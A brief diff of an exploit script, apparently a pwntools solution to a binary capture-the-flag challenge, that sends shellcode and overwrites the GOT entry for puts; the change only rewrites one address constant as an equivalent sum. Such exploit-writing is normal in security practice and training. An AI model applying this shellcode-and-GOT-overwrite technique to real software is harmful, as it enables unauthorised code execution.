@@ -25,7 +25,7 @@ y.sendafter( ':' , '\x00' + sc )
 
 y.sendafter( ':' , hex( e.got['puts'] ) )
 
-y.sendafter( ':' , p64( 0x6010a1 ) )
+y.sendafter( ':' , p64( 0x6010a0 + 1 ) )
 
 sleep(1)
 
